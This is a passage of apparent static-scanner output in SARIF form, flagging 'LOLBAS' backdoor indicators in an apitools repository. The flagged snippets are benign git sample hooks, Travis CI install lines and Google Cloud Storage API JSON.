            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 4,
                  "endLine": 8,
                  "endColumn": 9,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-receive.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to make use of push options.\n# The example simply echoes all push options that start with 'echoback='\n# and rejects all pushes when the \"reject\" push option is used.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 1,
                  "endLine": 38,
                  "endColumn": 6,
                  "snippet": {
                    "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                    "rendered": {
                      "text": "# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n",
                      "markdown": "`# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n#   /usr/bin/perl -i.bak -pe 'print \"\\n\" if !$first_line++' \"$COMMIT_MSG_FILE\"\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 37,
                  "endLine": 37,
                  "endColumn": 42,
                  "snippet": {
                    "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                    "rendered": {
                      "text": "#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n",
                      "markdown": "`#  *) ;;\n# esac\n\n# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# git interpret-trailers --in-place --trailer \"$SOB\" \"$COMMIT_MSG_FILE\"\n# if test -z \"$COMMIT_SOURCE\"\n# then\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 25,
                  "endLine": 32,
                  "endColumn": 31,
                  "snippet": {
                    "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                    "rendered": {
                      "text": "# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n",
                      "markdown": "`# case \"$COMMIT_SOURCE,$SHA1\" in\n#  ,|template,)\n#    /usr/bin/perl -i.bak -pe '\n#       print \"\\n\" . `git diff --cached --name-status -r`\n# \t if /^#/ && $first++ == 0' \"$COMMIT_MSG_FILE\" ;;\n#  *) ;;\n# esac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 40,
                  "endLine": 15,
                  "endColumn": 46,
                  "snippet": {
                    "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                    "rendered": {
                      "text": "# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n",
                      "markdown": "`# This hook includes three examples. The first one removes the\n# \"# Please enter the commit message...\" help message.\n#\n# The second includes the output of \"git diff --name-status -r\"\n# into the message, just before the \"git status\" output.  It is\n# commented because it doesn't cope with --amend or with squashed\n# commits.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/prepare-commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare the commit log message.\n# Called by \"git commit\" with the name of the file that has the\n# commit message, followed by the description of the commit\n# message's source.  The hook's purpose is to edit the commit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.travis.yml"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 3,
                  "endLine": 24,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    env: TOX_ENV=py35-oauth2client4\ninstall:\n  - pip install tox\n  - pip install . argparse\nscript: tox -e $TOX_ENV\nafter_success:\n  - if [[ \"${TOX_ENV}\" == \"py27-oauth2client4\" ]]; then tox -e coveralls; fi\n",
                    "rendered": {
                      "text": "    env: TOX_ENV=py35-oauth2client4\ninstall:\n  - pip install tox\n  - pip install . argparse\nscript: tox -e $TOX_ENV\nafter_success:\n  - if [[ \"${TOX_ENV}\" == \"py27-oauth2client4\" ]]; then tox -e coveralls; fi\n",
                      "markdown": "`    env: TOX_ENV=py35-oauth2client4\ninstall:\n  - pip install tox\n  - pip install . argparse\nscript: tox -e $TOX_ENV\nafter_success:\n  - if [[ \"${TOX_ENV}\" == \"py27-oauth2client4\" ]]; then tox -e coveralls; fi\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.travis.yml"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 3,
                  "endLine": 23,
                  "endColumn": 8,
                  "snippet": {
                    "text": "  - python: \"3.5\"\n    env: TOX_ENV=py35-oauth2client4\ninstall:\n  - pip install tox\n  - pip install . argparse\nscript: tox -e $TOX_ENV\nafter_success:\n",
                    "rendered": {
                      "text": "  - python: \"3.5\"\n    env: TOX_ENV=py35-oauth2client4\ninstall:\n  - pip install tox\n  - pip install . argparse\nscript: tox -e $TOX_ENV\nafter_success:\n",
                      "markdown": "`  - python: \"3.5\"\n    env: TOX_ENV=py35-oauth2client4\ninstall:\n  - pip install tox\n  - pip install . argparse\nscript: tox -e $TOX_ENV\nafter_success:\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 908,
                  "endLine": 998,
                  "endColumn": 916,
                  "snippet": {
                    "text": "ct.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy  Update object IAM policy.  \\n- storage.objects.update  Update object metadata.\",\n     \"items\": {\n      \"type\": \"string\"\n     }\n    }\n   }\n  }\n },\n \"resources\": {\n  \"bucketAccessControls\": {\n   \"methods\": {\n    \"delete\": {\n     \"id\": \"storage.bucketAccessControls.delete\",\n     \"path\": \"b/{bucket}/acl/{entity}\",\n     \"httpMethod\": \"DELETE\",\n     \"description\": \"",
                    "rendered": {
                      "text": "ct.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy  Update object IAM policy.  \\n- storage.objects.update  Update object metadata.\",\n     \"items\": {\n      \"type\": \"string\"\n     }\n    }\n   }\n  }\n },\n \"resources\": {\n  \"bucketAccessControls\": {\n   \"methods\": {\n    \"delete\": {\n     \"id\": \"storage.bucketAccessControls.delete\",\n     \"path\": \"b/{bucket}/acl/{entity}\",\n     \"httpMethod\": \"DELETE\",\n     \"description\": \"",
                      "markdown": "`ct.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy  Update object IAM policy.  \\n- storage.objects.update  Update object metadata.\",\n     \"items\": {\n      \"type\": \"string\"\n     }\n    }\n   }\n  }\n },\n \"resources\": {\n  \"bucketAccessControls\": {\n   \"methods\": {\n    \"delete\": {\n     \"id\": \"storage.bucketAccessControls.delete\",\n     \"path\": \"b/{bucket}/acl/{entity}\",\n     \"httpMethod\": \"DELETE\",\n     \"description\": \"`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 852,
                  "endLine": 998,
                  "endColumn": 860,
                  "snippet": {
                    "text": "cket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy  Update object IAM policy.  \\n- storage.objects.update  Update object metadata.\",\n     \"items\": {\n      \"type\": \"string\"\n     }\n    }\n   }\n  }\n },\n \"resources\": {\n  \"bucketAccessControls\": {\n   \"methods\": {\n    \"delete\": {\n     \"id\": \"storage.bucketAccessControls.delete\",\n     \"path\": \"b/{bucket}/acl/{enti",
                    "rendered": {
                      "text": "cket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy  Update object IAM policy.  \\n- storage.objects.update  Update object metadata.\",\n     \"items\": {\n      \"type\": \"string\"\n     }\n    }\n   }\n  }\n },\n \"resources\": {\n  \"bucketAccessControls\": {\n   \"methods\": {\n    \"delete\": {\n     \"id\": \"storage.bucketAccessControls.delete\",\n     \"path\": \"b/{bucket}/acl/{enti",
                      "markdown": "`cket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy  Update object IAM policy.  \\n- storage.objects.update  Update object metadata.\",\n     \"items\": {\n      \"type\": \"string\"\n     }\n    }\n   }\n  }\n },\n \"resources\": {\n  \"bucketAccessControls\": {\n   \"methods\": {\n    \"delete\": {\n     \"id\": \"storage.bucketAccessControls.delete\",\n     \"path\": \"b/{bucket}/acl/{enti`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 542,
                  "endLine": 998,
                  "endColumn": 550,
                  "snippet": {
                    "text": "lete bucket.  \\n- storage.buckets.get  Read bucket metadata.  \\n- storage.buckets.getIamPolicy  Read bucket IAM policy.  \\n- storage.buckets.create  Create bucket.  \\n- storage.buckets.list  List buckets.  \\n- storage.buckets.setIamPolicy  Update bucket IAM policy.  \\n- storage.buckets.update  Update bucket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy",
                    "rendered": {
                      "text": "lete bucket.  \\n- storage.buckets.get  Read bucket metadata.  \\n- storage.buckets.getIamPolicy  Read bucket IAM policy.  \\n- storage.buckets.create  Create bucket.  \\n- storage.buckets.list  List buckets.  \\n- storage.buckets.setIamPolicy  Update bucket IAM policy.  \\n- storage.buckets.update  Update bucket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy",
                      "markdown": "`lete bucket.  \\n- storage.buckets.get  Read bucket metadata.  \\n- storage.buckets.getIamPolicy  Read bucket IAM policy.  \\n- storage.buckets.create  Create bucket.  \\n- storage.buckets.list  List buckets.  \\n- storage.buckets.setIamPolicy  Update bucket IAM policy.  \\n- storage.buckets.update  Update bucket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.objects.list  List objects.  \\n- storage.objects.setIamPolicy`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 486,
                  "endLine": 998,
                  "endColumn": 494,
                  "snippet": {
                    "text": "issions are as follows:  \\n- storage.buckets.delete  Delete bucket.  \\n- storage.buckets.get  Read bucket metadata.  \\n- storage.buckets.getIamPolicy  Read bucket IAM policy.  \\n- storage.buckets.create  Create bucket.  \\n- storage.buckets.list  List buckets.  \\n- storage.buckets.setIamPolicy  Update bucket IAM policy.  \\n- storage.buckets.update  Update bucket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.object",
                    "rendered": {
                      "text": "issions are as follows:  \\n- storage.buckets.delete  Delete bucket.  \\n- storage.buckets.get  Read bucket metadata.  \\n- storage.buckets.getIamPolicy  Read bucket IAM policy.  \\n- storage.buckets.create  Create bucket.  \\n- storage.buckets.list  List buckets.  \\n- storage.buckets.setIamPolicy  Update bucket IAM policy.  \\n- storage.buckets.update  Update bucket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.object",
                      "markdown": "`issions are as follows:  \\n- storage.buckets.delete  Delete bucket.  \\n- storage.buckets.get  Read bucket metadata.  \\n- storage.buckets.getIamPolicy  Read bucket IAM policy.  \\n- storage.buckets.create  Create bucket.  \\n- storage.buckets.list  List buckets.  \\n- storage.buckets.setIamPolicy  Update bucket IAM policy.  \\n- storage.buckets.update  Update bucket metadata.  \\n- storage.objects.delete  Delete object.  \\n- storage.objects.get  Read object data and metadata.  \\n- storage.objects.getIamPolicy  Read object IAM policy.  \\n- storage.objects.create  Create object.  \\n- storage.object`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 919,
                  "startColumn": 608,
                  "endLine": 919,
                  "endColumn": 617,
                  "snippet": {
                    "text": "new IAM roles are:  \\n- roles/storage.admin  Full control of Google Cloud Storage resources.  \\n- roles/storage.objectViewer  Read-Only access to Google Cloud Storage objects.  \\n- roles/storage.objectCreator  Access to create objects in Google Cloud Storage.  \\n- roles/storage.objectAdmin  Full control of Google Cloud Storage objects.   The legacy IAM roles are:  \\n- roles/storage.legacyObjectReader  Read-only access to objects without listing. Equivalent to an ACL entry on an object with the READER role.  \\n- roles/storage.legacyObjectOwner  Read/write access to existing objects without listing",
                    "rendered": {
                      "text": "new IAM roles are:  \\n- roles/storage.admin  Full control of Google Cloud Storage resources.  \\n- roles/storage.objectViewer  Read-Only access to Google Cloud Storage objects.  \\n- roles/storage.objectCreator  Access to create objects in Google Cloud Storage.  \\n- roles/storage.objectAdmin  Full control of Google Cloud Storage objects.   The legacy IAM roles are:  \\n- roles/storage.legacyObjectReader  Read-only access to objects without listing. Equivalent to an ACL entry on an object with the READER role.  \\n- roles/storage.legacyObjectOwner  Read/write access to existing objects without listing",
                      "markdown": "`new IAM roles are:  \\n- roles/storage.admin  Full control of Google Cloud Storage resources.  \\n- roles/storage.objectViewer  Read-Only access to Google Cloud Storage objects.  \\n- roles/storage.objectCreator  Access to create objects in Google Cloud Storage.  \\n- roles/storage.objectAdmin  Full control of Google Cloud Storage objects.   The legacy IAM roles are:  \\n- roles/storage.legacyObjectReader  Read-only access to objects without listing. Equivalent to an ACL entry on an object with the READER role.  \\n- roles/storage.legacyObjectOwner  Read/write access to existing objects without listing`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 919,
                  "startColumn": 358,
                  "endLine": 919,
                  "endColumn": 367,
                  "snippet": {
                    "text": "Two types of roles are supported: new IAM roles, which grant permissions that do not map directly to those provided by ACLs, and legacy IAM roles, which do map directly to ACL permissions. All roles are of the format roles/storage.specificRole.\\nThe new IAM roles are:  \\n- roles/storage.admin  Full control of Google Cloud Storage resources.  \\n- roles/storage.objectViewer  Read-Only access to Google Cloud Storage objects.  \\n- roles/storage.objectCreator  Access to create objects in Google Cloud Storage.  \\n- roles/storage.objectAdmin  Full control of Google Cloud Storage objects.   The legacy IAM ",
                    "rendered": {
                      "text": "Two types of roles are supported: new IAM roles, which grant permissions that do not map directly to those provided by ACLs, and legacy IAM roles, which do map directly to ACL permissions. All roles are of the format roles/storage.specificRole.\\nThe new IAM roles are:  \\n- roles/storage.admin  Full control of Google Cloud Storage resources.  \\n- roles/storage.objectViewer  Read-Only access to Google Cloud Storage objects.  \\n- roles/storage.objectCreator  Access to create objects in Google Cloud Storage.  \\n- roles/storage.objectAdmin  Full control of Google Cloud Storage objects.   The legacy IAM ",
                      "markdown": "`Two types of roles are supported: new IAM roles, which grant permissions that do not map directly to those provided by ACLs, and legacy IAM roles, which do map directly to ACL permissions. All roles are of the format roles/storage.specificRole.\\nThe new IAM roles are:  \\n- roles/storage.admin  Full control of Google Cloud Storage resources.  \\n- roles/storage.objectViewer  Read-Only access to Google Cloud Storage objects.  \\n- roles/storage.objectCreator  Access to create objects in Google Cloud Storage.  \\n- roles/storage.objectAdmin  Full control of Google Cloud Storage objects.   The legacy IAM `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 858,
                  "startColumn": 73,
                  "endLine": 858,
                  "endColumn": 82,
                  "snippet": {
                    "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For lists of object access control entries, this is always storage#objectAccessControls.\",\n     \"default\": \"storage#objectAccessControls\"\n    }\n   }\n",
                    "rendered": {
                      "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For lists of object access control entries, this is always storage#objectAccessControls.\",\n     \"default\": \"storage#objectAccessControls\"\n    }\n   }\n",
                      "markdown": "`    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For lists of object access control entries, this is always storage#objectAccessControls.\",\n     \"default\": \"storage#objectAccessControls\"\n    }\n   }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 813,
                  "startColumn": 64,
                  "endLine": 813,
                  "endColumn": 73,
                  "snippet": {
                    "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For object access control entries, this is always storage#objectAccessControl.\",\n     \"default\": \"storage#objectAccessControl\"\n    },\n    \"object\": {\n",
                    "rendered": {
                      "text": "    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For object access control entries, this is always storage#objectAccessControl.\",\n     \"default\": \"storage#objectAccessControl\"\n    },\n    \"object\": {\n",
                      "markdown": "`    },\n    \"kind\": {\n     \"type\": \"string\",\n     \"description\": \"The kind of item this is. For object access control entries, this is always storage#objectAccessControl.\",\n     \"default\": \"storage#objectAccessControl\"\n    },\n    \"object\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 722,
                  "startColumn": 64,
                  "endLine": 722,
                  "endColumn": 68,
                  "snippet": {
